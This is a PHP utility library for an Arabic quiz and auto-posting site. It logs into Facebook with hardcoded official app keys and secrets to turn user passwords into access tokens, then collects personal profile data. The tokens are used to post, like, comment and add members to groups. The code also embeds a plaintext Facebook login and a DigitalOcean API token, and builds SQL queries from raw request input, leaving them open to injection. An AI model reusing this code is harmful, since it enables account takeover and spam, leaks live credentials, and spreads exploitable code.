        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    // Timeout in seconds
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    // Download the given URL, and return output
    $output = curl_exec($ch);
    // Close the cURL resource, and free system resources
    curl_close($ch);
    return $output;
}
function Json($url = "", $t = true, $f = false)
{
    return json_decode(curl_download($url, $f), $t);
}
function  Ctokn($access)
{
    $e = Json("https://graph.facebook.com/me/permissions?access_token="  . $access)['error']['message'];
    if ($e  == "") {
        return true;
    }
    return false;
}
function getLoginUrl($user, $pass, $type = "android")
{
    if ($type == "android") {
        $apikey = "882a8490361da98702bf97a021ddc14d";
        $sec = "62f8ce9f74b12f84c123cc23437a4a32";
    } else {
        $apikey = "3e7c78e35a76a9299309885393b02d97";
        $sec = "c1e620fa708a1d5696fb991c1bde5662";
    }
    $mdtet = "api_key=" . $apikey . "email=" . $user . "format=JSONlocale=vi_vnmethod=auth.loginpassword=" . $pass . "return_ssl_resources=0v=1.0" . $sec;
    $Mapp = "api_key=" . $apikey . "&email=" . $user . "&format=JSON&locale=vi_vn&method=auth.login&password=" . $pass . "&return_ssl_resources=0&v=1.0";
    return "https://api.facebook.com/restserver.php?" . $Mapp . "&sig=" . md5($mdtet);
}
function Nlogin($user = "", $pass = "", $type = "android")
{
    $error = 0;
    $token = "";
    $msg = "";
    if ($type == "android") {
        $apikey = "882a8490361da98702bf97a021ddc14d";
        $sec = "62f8ce9f74b12f84c123cc23437a4a32";
    } else {
        $apikey = "3e7c78e35a76a9299309885393b02d97";
        $sec = "c1e620fa708a1d5696fb991c1bde5662";
    }
    //$pas = str_replace("#","",$pass);
    //https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email=mohtasm.sawilh&format=JSON&locale=vi_vn&method=auth.login&password=mohtasmadmin10QQ&return_ssl_resources=0&v=1.0&sig=3ebba1fff1ace1dd3ff1cddf81e9bd7a
    $mdtet = "api_key=" . $apikey . "email=" . $user . "format=JSONlocale=vi_vnmethod=auth.loginpassword=" . $pass . "return_ssl_resources=0v=1.0" . $sec;
    $Mapp = "api_key=" . $apikey . "&email=" . $user . "&format=JSON&locale=vi_vn&method=auth.login&password=" . $pass . "&return_ssl_resources=0&v=1.0";
    $ar = json("https://api.facebook.com/restserver.php?" . $Mapp . "&sig=" . md5($mdtet));
    if ($ar["error_code"]) {
        //Sion("Lerror",$ar["error_code"]);
        $error = $ar["error_code"];
        $msg = $ar["error_msg"];
    } else {
        //SqlIn("fbusers",array("username"=>$user,"password"=>$pass,"date"=>time(),"Lerror"=>$ar["error_code"]));
        $token = $ar["access_token"];
        $json = 'https://graph.facebook.com/me?fields=mobile_phone,id,name,location,email,religion,link,gender,birthday,about,education,cover,relationship_status&method=get&access_token=' . $ar["access_token"];
        $array = json($json);
        iSion("token", $ar["access_token"]);
        iSion("spass", $ar["access_token"]);
    }
    return array("error" => $error, "msg" => $msg, "info" => $array, "token" => $token);
}
function getInfo($access)
{
    $json = 'https://graph.facebook.com/me?fields=mobile_phone,id,name,location,email,religion,link,gender,birthday,about,education,cover,relationship_status&method=get&access_token=' . $access;
    $array = json($json);
    $error = 0;
    if ($array["error"]) {
        $error = 1;
        $msg = $array["error"]["message"];
    }
    return array("error" => $error, "msg" => $msg, "info" => $array, "token" => $access);
}
function getPost()
{
    $slug = isv("slug");
    if ($slug) {
        return Sel("quiz", "where title='" . getSlug($slug, true) . "'  or slug='" . $slug . "'   ");
    }
    return Sel("quiz", "where id=" . isv("vid"));
}
function getCat()
{
    $slug = isv("slug");
    if (isv("app") == "user") {
        $object = json_decode(json_encode((object) array("title" => "العضو " . isv("id"))), FALSE);
        return $object;
    } else if (isv("app") == "pages")
        return Sel("pages", "where id=" . isv("id"));
    if ($slug) {
        $sql = Sel("categories", "where slug='" . $slug . "'");
        return $sql;
    }
    return Sel("categories", "where id=" . isv("id"));
}
function menuActive($id)
{
    global $FUr;
    /*    $slug = isv("type");
   if(!$slug)*/
    $slug = isv("app");
    if ($slug == $id || isv("type") == $id || !$slug && $id == "index")
        return "active";
    return "";
}
function payStatus($role = -1)
{
    global $_lang;
    global $_allLang;
    $ar = [
        3 => [
            "title" => $_lang["Canceled"],
            "etitle" => $_allLang["english"]["Canceled"],
            "atitle" => $_allLang["_arabic"]["Canceled"],
            "class" => 'dark'
        ],
        1 => [
            "title" => $_lang['Paid'],
            "etitle" => $_allLang["english"]["Paid"],
            "atitle" => $_allLang["_arabic"]["Paid"],
            "class" => 'success'
        ],
        0 => [
            "title" => $_lang['Pending'],
            "etitle" => $_allLang["english"]["Pending"],
            "atitle" => $_allLang["_arabic"]["Pending"],
            "class" => 'warning'
        ]
    ];
    if ($role === false || $role === -1)
        return $ar;
    return $ar[$role];
}
function orderStatus($role = -1)
{
    global $_lang;
    global $_allLang;
    $ar = [
        1 => [
            "title" => $_lang["Canceled"],
            "etitle" => $_allLang["english"]["Canceled"],
            "atitle" => $_allLang["_arabic"]["Canceled"],
            "class" => 'dark'
        ],
        3 => [
            "title" => $_lang['Done'],
            "etitle" => $_allLang["english"]["Done"],
            "atitle" => $_allLang["_arabic"]["Done"],
            "class" => 'success'
        ],
        4 => [
            "title" => $_lang['Waitingdelivery'],
            "etitle" => $_allLang["english"]["Waitingdelivery"],
            "atitle" => $_allLang["_arabic"]["Waitingdelivery"],
            "class" => 'info'
        ],
        2 => [
            "title" => $_lang['Refunded'],
            "etitle" => $_allLang["english"]["Refunded"],
            "atitle" => $_allLang["_arabic"]["Refunded"],
            "class" => 'danger'
        ],
        0 => [
            "title" => $_lang['Pending'],
            "etitle" => $_allLang["english"]["Pending"],
            "atitle" => $_allLang["_arabic"]["Pending"],
            "class" => 'warning'
        ]
    ];
    if ($role === false || $role === -1)
        return $ar;
    return $ar[$role];
}
function roles($role = -1)
{
    global $_lang;
    $ar = [
        0 => ["name" => $_lang["User"], "icon" => "user", "color" => "primary"],
        1 => ["name" => $_lang["Admin"], "icon" => "slack", "color" => "danger"],
        2 => ["name" => $_lang["Seller"], "icon" => "database", "color" => "success"]
    ];
    $ar = array_map(function ($v) {
        return $v + ["title" => $v["name"]];
    }, $ar);
    if ($role === false || $role === -1)
        return $ar;
    return $ar[$role];
}
function getPages($slug = false, $ob = true)
{
    if (!$slug)
        $slug = isv("type");
    if (!$slug)
        $slug = isv("app");
    if (!$slug)
        $slug = "index";
    if ($slug) {
        if ($ob)
            $sql = Sel("pages", "where slug='" . $slug . "'");
        else
            $sql = Selaa("pages", "where slug='" . $slug . "'");
        //if (!$sql)
        // $sql = ($ob ? Sel("pages", "where slug='index'") : Selaa("pages", "where slug='index'"));
        return $sql;
    }
    return ($ob ? Sel("pages", "where id=" . isv("id")) : Selaa("pages", "where id=" . isv("id")));
}
function getUsers($id = null)
{
    $id = isv("id", true);
    if (!$id)
        $id = Sion("user_id");
    Sion("user_id", $id);
    $sql = Sel("users", "where pk='" . $id . "' and login=" . Sion("login_id"));
    return $sql;
}
function getAuthor()
{
    $slug = isv("slug");
    if ($slug) {
        $sql = Sel("authors", "where slug='" . $slug . "'");
        return $sql;
    }
    return Sel("authors", "where id=" . isv("id"));
}
function isView($pid = false)
{
    if (Ls("admin"))
        return "";
    $cantry = visitor_country();
    $browser = get_browser_name();
    if (!$pid)
        $pid = isv("vid");
    Cinst("vistors", array("pid" => $pid, "ip" => ip(), "cantry" => $cantry, "device" => getOS(), "browser" => $browser, "date" => time()), "where  ip='" . ip() . "' and   pid=" . $pid);
    UpDate("quiz", "views", Num("vistors", "where pid=" . $pid), "where id=" . $pid);
}
function Coky($sion)
{
    if (isset($_COOKIE[$sion])) {
        return $_COOKIE[$sion];
    } else {
        return false;
    }
}
function iCoky($cookie_name, $cookie_value, $time = 60)
{
    setcookie($cookie_name, $cookie_value, time() + ($time * 60));
}
function Sion($sion, $v = -1, $d = false)
{
    if ($v !== -1)
        return iSion($sion, $v);
    if (isset($_SESSION[$sion])) {
        return $_SESSION[$sion];
    } else if (isset($_COOKIE[$sion])) {
        return $_COOKIE[$sion];
    } else {
        return $d;
    }
}
function iSion($sion, $v, $d = 0)
{
    if ($d)
        setcookie($sion, $v, time() + ($d * (3 * 60)));
    $_SESSION[$sion] =  $v;
    if (Sion($sion)) {
        return $_SESSION[$sion];
    } else {
        return false;
    }
}
function SQ($sq)
{
    $s =  base64_decode($sq);
    return $s;
}
function Remove($tb = "", $where = "")
{
    global $DBcon;
    $sql =  mysqli_query($DBcon, "delete  from $tb $where");
    if ($sql) {
        return true;
    } else {
        return false;
    }
}
function Ser($html)
{
    return addslashes(htmlspecialchars(strip_tags($html)));
}
function De($html)
{
    return stripslashes($html);
}
function Cstr($str = "", $md = false)
{
    $str = Rstr(Rstr(Rstr(Rstr(Rstr(Rstr(Rstr(De($str)), '"', ''), "'", ''), '--', ''), '//', ''), '-', ''), " ", "");
    if ($md) {
        return md5($str);
    } else {
        return $str;
    }
}
function getLogo($us = false)
{
    global $user;
    //$us =  getUse($user);
    if (!$us)
        $us = $user;
    if ($us->avtar) {
        return "http://www.gravatar.com/avatar/" . md5($us->email) . "?s=200";
    }
    //return "http://www.gravatar.com/avatar/35c6aa0f77b5a327a002d79f7d505681?s=200";
    //return getSet()->logo_defult;
    return FbImg($us->fb_id);
}
function getUse($user = false)
{
    $id = "where id='" . $user . "' ";
    if (!$user)
        $id = "where id=" . Sion("id");
    return Sel("users", $id);
}
function WR($w = false, $fille = "num.txt")
{
    if (!$w) {
        $file = fopen($fille, "r+");
        $num = fread($file, filesize($fille));
        if (!$num) {
            $num = 1;
        }
        return $num;
    } else {
        $file = fopen($fille, "w+");
        return fwrite($file, $w);
    }
    fclose($file);
}
function Rd($t = false, $l = "")
{
    if ($t) {
        echo '<script type="text/javascript">
var l =0; var t = ' . $t . ';
setInterval(function (){ l++; if(l == t){ location.replace("' . $l . '"); } },1000);
</script>
';
    }
}
function Numday($appsql, $d = "today", $where = " ")
{
    $user = 0;
    $d = strtotime($d);
    $S = getUser($appsql, $where . ' order by id desc ');
    if ($S) {
        for ($i = 0; $i < count($S); $i++) {
            $T = $S[$i];
            if (date("Y-m-d", $T['data']) == date("Y-m-d", $d)) {
                $user += 1;
            }
        }
    }
    return $user;
}
function nUser($id, $where)
{
    global $GP;
    global $DBcon;
    //$where = str_replace("where","",$where);
    $sql = mysqli_query($DBcon, "select * from $GP   $where  and id>$id limit 1");
    if (mysqli_num_rows($sql) >= 1) {
        $data = mysqli_fetch_object($sql);
        return $data->id;
    } else {
        return 0;
    }
}
function addPdfWater($file, $water = array(), $newFile = null)
{
    $pdf = new  setasign\Fpdi\Fpdi();
    $pages_count = $pdf->setSourceFile($file);
    for ($i = 1; $i <= $pages_count; $i++) {
        $pdf->AddPage();
        $tplIdx = $pdf->importPage($i);
        $pdf->useTemplate($tplIdx, 0, 0, null, null, true);
        $pdf->Image($water[0], 0, 0, 30, 0, 'PNG', $water[1]);
    }
    if (empty($newFile)) {
        $pdf->Output();
    } else {
        $pdf->Output($newFile, 'F');
    }
}
function is_base646($s)
{
    return (bool) preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $s);
}
function is_base64_encoded($data)
{
    if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $data)) {
        return TRUE;
    } else {
        return FALSE;
    }
}
function validBase64($string)
{
    $decoded = base64_decode($string);
    // Check if there is no invalid character in string
    if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $string)) return false;
    echo "preg_match </br>";
    // Decode the string in strict mode and send the response
    if (!$decoded) return false;
    echo "base64_decode </br>";
    // Encode and compare it to original one
    if (base64_encode($decoded) !== $string) return false;
    echo $string . " - " . base64_encode($decoded);
    return true;
}
function is_base64($string)
{
    $zero_one = ['MA==', 'MQ=='];
    if (in_array($string, $zero_one)) return TRUE;
    if (empty(htmlspecialchars(base64_decode($string, TRUE))))
        return FALSE;
    return TRUE;
};
function UpDate($tb = "", $name = "", $data = "", $where = "")
{
    global $DBcon;
    $tb = strtolower($tb);
    if (is_object($name))
        $name = jsonOut($name);
    if (is_array($name)) {
        $keys = "";
        $values = "";
        $i = count($name);
        foreach ($name as $key => $value) {
            /*   $col = mysqli_query($DBcon, "SELECT ".$key." FROM ".$tb." ");
            if (!$col) {
                mysqli_query($DBcon, "ALTER TABLE ".$tb." ADD ".$key." text CHARACTER SET utf8 NOT NULL");
            }*/
            if ($key == "password")
                $value = md5($value);
            if (is_base64($value))
                $value = base64_decode($value);
            if (strpos($key, "date") !== false  && $value && (count(explode("/", $value)) > 1 || count(explode("-", $value)) > 1))
                $value = strtotime($value);
            $sql = UpDate($tb, $key, convert_bool($value), $where);
            $i--;
        }
    } else {
        /*$col = mysqli_query($DBcon, "SELECT ".$name." FROM ".$tb." ");
        if (!$col) {
            mysqli_query($DBcon, "ALTER TABLE ".$tb." ADD ".$name." text CHARACTER SET utf8 NOT NULL");
        }*/
        $data = str_replace('"', '\"', $data);
        $value = $data;
        //$data = (is_array($data) ? json_encode($data) : $data);
        $data = $value;
        /// echo 'update `'.$tb.'` set `'.$name.'`="'.$data.'" '.$where;
        if (strpos($name, "-") !== false || strpos($name, "+") !== false) {
            $i = (strpos($name, "-") !== false ? "-" : "+");
            $name = str_replace(["-", "+"], "", $name);
            $data = "`" . $name . "` " . $i . " " . $data;
            $sql = 'update `' . $tb . '` set `' . $name . '`=' . $data . ' ' . $where;
        } else
            $sql = 'update `' . $tb . '` set `' . $name . '`="' . $data . '" ' . $where;
        $sql =  mysqli_query($DBcon, $sql);
    }
    if ($sql) {
        return true;
    } else {
        return false;
    }
}
function convert_img($value, $raw = 1)
{
    if (is_array($value)) {
        $value = array_map(function ($v) {
            if (!is_array($v)) {
                if (strpos($v, "base64")  !== false) {
                    list($type, $data) = explode(';', $v);
                    list(, $data)      = explode(',', $data);
                    $data = base64_decode($data);
                    $type = explode("/", $type);
                    $type = end($type);
                    $file_name = "file" . time() . "." . $type;
                    file_put_contents('uploads/' . $file_name, $data);
                    $v = $file_name;
                }
            } else
                $v = array_combine(
                    array_keys($v),
                    array_map(
                        function ($key, $value) {
                            if (strpos($value, "base64")  !== false) {
                                list($type, $data) = explode(';', $value);
                                list(, $data)      = explode(',', $data);
                                $data = base64_decode($data);
                                $type = explode("/", $type);
                                $type = end($type);
                                $file_name = "file" . time() . "." . $type;
                                file_put_contents('uploads/' . $file_name, $data);
                                $value = $file_name;
                                sleep(1);
                            }
                            return $value;
                        },
                        array_keys($v),
                        array_values($v)     // can omit array_values() and use $myArray
                    )
                );
            return $v;
        }, $value);
        // print_r(json_encode($raw));
        if ($raw)
            $value = rawurlencode(json_encode($value));
        else
            $value = json_encode($value);
    }
    return $value;
}
function sanitize_output($buffer)
{
    $search = array(
        '/\>[^\S ]+/s',     // strip whitespaces after tags, except space
        '/[^\S ]+\</s',     // strip whitespaces before tags, except space
        '/(\s)+/s',         // shorten multiple whitespace sequences
        '/<!--(.|\s)*?-->/' // Remove HTML comments
    );
    $replace = array(
        '>',
        '<',
        '\\1',
        ''
    );
    $buffer = preg_replace($search, $replace, $buffer);
    return $buffer;
}
function jsonOut($json)
{
    return json_decode(json_encode($json), true);
}
function getPostId($target)
{
    $target = explode("/", $target);
    $target = $target[count($target) - 2];
    return InstagramAPI\InstagramID::fromCode($target);
}
function getAds()
{
    global $DBcon;
    $SQL = @mysqli_query($DBcon, "SELECT * FROM ads");
    return @mysqli_fetch_object($SQL);
}
function getSet($key = "", $val = "")
{
    global $DBcon;
    if ($key)
        return UpDate("settings", $key, $val);
    $SQL = @mysqli_query($DBcon, "SELECT * FROM settings");
    return @mysqli_fetch_object($SQL);
}
function SqlEmpty($tp = "")
{
    global $DBcon;
    $SQL =  mysqli_query($DBcon, "TRUNCATE $tp");
    return $SQL;
}
function getUser($tp = "", $where = "", $w = "*")
{
    global $DBcon;
    $tp = strtolower($tp);
    $sql = mysqli_query($DBcon, "select $w from $tp  $where");
    if ($sql && mysqli_num_rows($sql)) {
        $info = array();
        while ($data =  mysqli_fetch_assoc($sql)) {
            $info[] = $data;
        }
        return $info;
    }
    return [];
}
function Sel($tp = "", $w = '')
{
    global $DBcon;
    $tp = strtolower($tp);
    $Sql =  mysqli_query($DBcon, "select * from $tp $w");
    if ($Sql) {
        $N = mysqli_fetch_object($Sql);
        return  $N;
    } else {
        return false;
    }
}
function Selaa($tp = "", $w = '')
{
    global $DBcon;
    $tp = strtolower($tp);
    $Sql =  mysqli_query($DBcon, "select * from $tp $w");
    if ($Sql) {
        $N = mysqli_fetch_assoc($Sql);
        return  $N;
    } else {
        return false;
    }
}
function digital($DROPLET_ID = 88299098, $token = "c345be5976289a2b3af6ecc4aeabd829b6dcf5e78644a398d400c1b0f81f094e")
{
    $data = array("type" => "reboot");
    $data_string = json_encode($data);
    $ch = curl_init('https://api.digitalocean.com/v2/droplets/' . $DROPLET_ID . '/actions');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    curl_setopt(
        $ch,
        CURLOPT_HTTPHEADER,
        array(
            'Authorization: Bearer ' . $token,
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data_string)
        )
    );
    $result = curl_exec($ch);
    return $result;
}
function last_share($t = 0, $last = 0, $m = false)
{
    if (!$m) {
        $corn_time = $t * 60 * 60;
    } else {
        $corn_time = $t * 60;
    }
    $next = $last + $corn_time;
    if ($next <= time()) {
        return true;
    } else {
        return false;
    }
}
function user_share()
{
    $next = Sel("posts", "where time='1' and Tsend='0' and time_share<='" . time() . "' ");
    if ($next) {
        return  array('id' => $next->id, 'user' => $next->userid, 'PostTo' => $next->PostTo);;
    } else {
        return false;
    }
}
function checkId($myString)
{
    return preg_match('/[0-9]/', $myString);
}
function SqlError()
{
    global $DBcon;
    return mysqli_error($DBcon);
}
function resize_image($file, $w, $h, $crop = FALSE)
{
    list($width, $height) = getimagesize($file);
    $r = $width / $height;
    if ($crop) {
        if ($width > $height) {
            $width = ceil($width - ($width * abs($r - $w / $h)));
        } else {
            $height = ceil($height - ($height * abs($r - $w / $h)));
        }
        $newwidth = $w;
        $newheight = $h;
    } else {
        if ($w / $h > $r) {
            $newwidth = $h * $r;
            $newwidth = $w;
            $newheight = $h;
        } else {
            $newheight = $h;
            $newwidth = $w;
        }
    }
    $src = getImage($file);
    $dst = imagecreatetruecolor($newwidth, $newheight);
    imagealphablending($dst, true);
    imagesavealpha($dst, true);
    //$transparent = imagecolorallocate($dst,0,255,0);
    //imagecolortransparent($dst,$transparent);
    //imagefilledrectangle($dst,0,0,127,127,$transparent);
    imagecopyresampled($dst, $src, 0, 0, 0, 0, $newwidth, $newheight, $width, $height);
    //imagecopyresized($dst, $src, 0, 0, 0, 0, $newwidth, $newwidth, $width, $height);
    return $dst;
}
function MakeMark($im, $stamp, $name = "")
{
    //$stamp = getImage($stamp);
    $stamp = resize_image($stamp, 138, 60);
    $im = getImage($im);
    $marge_right = 10;
    $marge_bottom = 10;
    $sx = imagesx($stamp);
    $sy = imagesy($stamp);
    $black = imagecolorallocate($stamp, 0, 0, 0);
    imagecolortransparent($stamp, $black);
    imagecopy($im, $stamp, imagesx($im) - $sx - $marge_right, imagesy($im) - $sy - $marge_bottom, 0, 0, imagesx($stamp), imagesy($stamp));
    if ($name)
        imagejpeg($im, $name);
    return $im;
}
function getURL($url, $proxy = null)
{
    $timeout = 30;
    $ch      = curl_init();
    //$timeout = 60; // set to zero for no timeout
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($proxy)
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $file_contents = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        throw new Exception("CURLError: " . $error_msg . " " . $proxy);
    }
    curl_close($ch);
    return $file_contents;
    return ($file_contents ? $file_contents : $error_msg);
}
function is_english($str)
{
    if (strlen($str) != strlen(utf8_decode($str))) {
        return false;
    } else {
        return true;
    }
}
function getImage2($photo_to_paste)
{
    $name = strtolower(pathinfo($photo_to_paste, PATHINFO_EXTENSION));
    if ($name == "gif") //gif
        $im2 = imagecreatefromgif("$photo_to_paste");
    else if ($name == "png")
        $im2 = imagecreatefrompng("$photo_to_paste");
    //else if($name == "jpg" || $name == "jpeg" || substr($photo_to_paste,0,4) == "http"){ //jpg
    else
        $im2 = imagecreatefromjpeg("$photo_to_paste");
    //}
    return $im2;
}
function  saveBase64($data, $user = "image")
{
    if (preg_match('/^data:image\/(\w+);base64,/', $data, $type)) {
        $data = substr($data, strpos($data, ',') + 1);
        $type = strtolower($type[1]); // jpg, png, gif
        if (!in_array($type, ['jpg', 'jpeg', 'gif', 'png'])) {
            return "";   //throw new \Exception('invalid image type');
        }
        $data = base64_decode($data);
        if ($data === false) {
            return "";    //throw new \Exception('base64_decode failed');
        }
    } else {
        // throw new \Exception('did not match data URI with image data');
        return "";
    }
    file_put_contents($user . ".{$type}", $data);
    return  getSet()->url . str_replace("..", "", $user) . ".{$type}";
}
function getImage($source_url)
{
    /*  $imageData = base64_decode($source_url);
     $source = imagecreatefromstring($imageData);*/
    $info = getimagesize($source_url);
    if ($info['mime'] == 'image/jpeg')
        $image = imagecreatefromjpeg($source_url);
    elseif ($info['mime'] == 'image/gif')
        $image = imagecreatefromgif($source_url);
    elseif ($info['mime'] == 'image/png')
        $image = imagecreatefrompng($source_url);
    // imagejpeg($image, $destination_url, $quality);
    //print_r($info);
    return $image;
}
function SqlIn($tp = "", $data = "", $f = false, $c = false)
{
    global $DBcon;
    $tp =  strtolower($tp);
    if (is_array($data)) {
        $keys = '';
        $values = '';
        $i = count($data);
        $i = 0;
        foreach ($data as $key => $value) {
            /*   $col = mysqli_query($DBcon, "SELECT ".$key." FROM ".$tp." ");
             if (!$col) {
                 mysqli_query($DBcon, "ALTER TABLE ".$tp." ADD ".$key." text CHARACTER SET utf8 NOT NULL");
             }*/
            if ($key == "password" and !$f) {
                $value = md5($value);
            }
            //if (base64_encode(base64_decode($value, true)) === $value)
            // $value = base64_decode($value);
            if (strpos($key, "date") !== false && $value && (count(explode("/", $value)) > 1 || count(explode("-", $value)) > 1))
                $value = strtotime($value);
            $value = (is_array($value) ? json_encode($value) : $value);
            $value = str_replace('"', '\"', $value);
            $value = convert_bool($value);
            $keys .= ($i ? "," : "") . '`' . $key . '`';
            $values .=  ($i ? "," : "") . '"' . $value . '"';
            /*             if ($i == 1) {
                 $keys .= $key;
                 $values .=  ' "'.$value.'" ';
             } else {
                 $keys .= '`'.$key.'`,';
                 $values .= ' "'.$value.'",';
             }*/
            $i++;
        }
        $sql = 'insert into `' . $tp . '` (' . $keys . ') values (' . $values . ')';
        //echo $sql;
        $Add = mysqli_query($DBcon, $sql);
        if ($Add) {
            $id =  mysqli_insert_id($DBcon);
            return $id;
        } else {
            return false;
        }
    }
    return false;
}
function Ctime($T = false)
{
    $R = "كل  ساعتين منشور واحد";
    if ($T == 4) {
        $R = "كل 4 ساعات منشور واحد";
    } elseif ($T == 6) {
        $R = "كل 6 ساعات منشور واحد";
    } elseif ($T == 12) {
        $R = "كل 12 ساعه منشور واحد";
    } elseif ($T == 24) {
        $R = "كل 24 ساعه منشور واحد";
    }
    return $R;
}
function isv($is = '', $a = false)
{
    if (isset($_POST[$is]) and !$a) {
        return $_POST[$is];
    } elseif (isset($_GET[$is])) {
        return $_GET[$is];
    } elseif (isset($_FILES[$is])) {
        return $_FILES[$is];
    }
    return false;
}
function NotToken()
{
    if (!Ctoken(getSet()->token)) {
        UpDate("settings", "zapier", 1);
    } else {
        UpDate("settings", "zapier", 0);
    }
}
function Cinst($tb, $arm, $wr)
{
    if (Sel($tb, $wr)) {
        $sq = UpDate($tb, $arm, null, $wr);
    } else {
        $sq = SqlIn($tb, $arm, true);
    }
    return $sq;
}
function rtoken()
{
    if (!Ctoken(getSet()->token)) {
        $user = "mohtasm.sawilh";
        $pass = "L5NRU322EU";
        $log = Nlogin($user, $pass);
        if ($log["error"] == 0) {
            UpDate('settings', 'token', $log["token"]);
        }
    }
}
function Rstr($str = "", $r = " ", $rr = "")
{
    return  str_replace($r, $rr, $str);
}
function Uvideo($id, $R = false)
{
    if (!$R or $R == null) {
        $r = getSet()->url . '/video' . $id . '.html';
    } else {
        $r = $R . '/video' . $id . '.html';
    }
    return $r;
}
function Tpost($Tpost, $userid, $postb)
{
    if ($Tpost != "likes" and $Tpost != "comments" and  $Tpost != "add_groups") {
        $ptags = " ";
        $phot = false;
        if ($Tpost == 0) {
            $ad = 'https://graph.facebook.com/' . $userid . '/feed?message=' . urlencode($postb['message']) . '&method=post&access_token=' . $postb['access_token'];
        } elseif ($Tpost == 3) {
            $ad = 'https://graph.facebook.com/' . $userid . '/feed?message=' . urlencode($postb['message']) . '&description=' . urlencode($postb['description']) . '&picture=' . urlencode($postb['picture']) . '&link=' . urlencode($postb['link']) . '&name=' . urlencode($postb['name']) . '&method=post&access_token=' . $postb['access_token'];
        } elseif ($Tpost == 5 or $Tpost == 2 or $Tpost == 6) {
            $phot = true;
            if ($postb['tags']) {
                $data = array(array('tag_uid' => $postb['tags'], 'x' => rand() % 100, 'y' => rand() % 100));
                $data = json_encode($data);
                $ptags = "&tags=" . $data;
            }
            $ad = 'https://graph.facebook.com/' . $userid . '/photos?url=' . urlencode($postb['url']) . '&message=' . urlencode($postb['message']) . '&method=post&access_token=' . $postb['access_token'] . $ptags;
        } else {
            $ad = 'https://graph.facebook.com/' . $userid . '/feed?link=' . urlencode($postb['link']) . '&message=' . urlencode($postb['message']) . '&method=post&access_token=' . $postb['access_token'];
        }
        if ($postb['tags'] && !$phot) {
            //$ad .= '&tags='.$postb['tags'];
            $ad .= '&tags=' . $postb['tags'];
        }
    } elseif ($Tpost == "likes") {
        $ad = 'https://graph.facebook.com/' . $userid . '/likes?method=post&access_token=' . $postb['access_token'];
    } elseif ($Tpost == "comments") {
        $ad = 'https://graph.facebook.com/' . $userid . '/comments?method=post&access_token=' . $postb['access_token'] . '&message=' . urlencode($postb['message']);
    } elseif ($Tpost == "add_groups") {
        $ad = 'https://graph.facebook.com/' . $userid . '/members?method=post&access_token=' . $postb['access_token'] . '&member=' . urlencode($postb['uid']);
    }
    return json_decode(readURL($ad), true);
}
function tags($id)
{
    $user = getUser('friends', 'where uid="' . $id . '" order by rand() ');
    if (isset($user)) {
        for ($x = 0; $x < count($user); $x++) {
            $uid .= ',' . $user[$x]['pid'];
        }
        $uid = str_replace(',,', ',', substr($uid, 1, strlen($uid)));
    }
    return $uid;
}
function getPageM($pageid = '')
{
    $pageinfo = Json('https://graph.facebook.com/' . $pageid . '/?fields=access_token&access_token=' . getSet()->token . '&method=GET');
    if ($pageinfo) {
        return $pageinfo['access_token'];
    }
    return getSet()->token;
}
function getPage($userid = '', $pageid = '', $c = false)
{
    $info = Sel('users', 'where user_id=' . $userid);
    if ($info) {
        $pageinfo = Json('https://graph.facebook.com/' . $pageid . '/?fields=access_token&access_token=' . $info->access . '&method=GET');
        if ($pageinfo) {
            return $pageinfo['access_token'];
        }
        return $info->access;
    }
}
function TimeShare($A = false)
{
    global $appsql;
    global $app;
    global $PUr;
    global $Werd;
    $w = true;
    if ($A) {
        $S = Sel('share');
        $time = time();
        if ($A == "quran") {
            if ($Werd) {
                $msg  =  $S->werd_msg;
                $tt = 24;
            } else {
                $msg  =  $S->quran_msg;
                $tt = $S->time_msg;
            }
        } elseif ($A == "video") {
            $msg  =  $S->share_video;
            $tt = 4;
            //	$w=false;
        } else {
            $msg  =  $S->share_msg;
            $tt = $S->time_msg;
        }
        if (last_share($tt, $msg) and $w) {
            $aa = array(
                'time' => 0,
                'post' => 0,
                'blog' => 2,
                'St' => 0,
                'quran' => 0,
                'htc' => 0,
            );
        } else {
            $aa = false;
        }
        return $aa;
    }
    $S = Sel('share');
    $time = time();
    $corn_time = $S->time * 60 * 60;
    $share = 'share' . $S->time;
    $next = $S->$share + $corn_time;
    $appid = 1;
    if ($appid != "") {
        if (last_share($S->time, $S->$share) and Num($appsql, 'where time=' . $S->time) > 0 and getSet()->cron == 2) {
            $tt = $S->time;
            if ($tt == 4) {
                $tp = 0;
            } elseif ($tt == 6) {
                $tp = 4;
            } elseif ($tt == 12) {
                $tp = 6;
            } elseif ($tt == 24) {
                $tp = 12;
            }
            if ($tt == 4) {
                $btp = 2;
            } elseif ($tt == 6) {
                $btp = 1;
            } elseif ($tt == 12) {
                $btp = 1;
            } elseif ($tt == 24) {
                $btp = 1;
            }
            $aa = array(
                'time' => $tt,
                'post' => $tp,
                'blog' => $btp,
                'St' => 0,
                'quran' => 0,
                'htc' => $htc,
            );
        } elseif (last_share(getSet()->crontime, getSet()->last_share) and Num($appsql) > 0 and getSet()->cron == 1) {
            $aa = array(
                'time' => getSet()->crontime,
                'post' => 0,
                'blog' => 2,
                'St' => 1,
                'quran' => 0,
                'htc' => $htc,
            );
        } elseif (last_share(24, getSet()->num_share)  and $app['quran'] == 1) {
            $aa = array(
                'time' => 24,
                'post' => 6,
                'blog' => 2,
                'St' => 0,
                'quran' => 1,
                'htc' => $htc,
            );
        } else {
            $aa = false;
            $a = array(
                5 => 6,
                7 => 12,
                13 => 24,
                25 => 4,
            );
            UpDate('share', 'time', $a[$S->time + 1]);
        }
    } else {
        $aa = false;
    }
    return $aa;
}
function Num($tp = '', $w = '')
{
    global $DBcon;
    $Sql =  mysqli_query($DBcon, "select * from $tp $w");
    if ($Sql) {
        return  mysqli_num_rows($Sql);
    } else {
        return  false;
    }
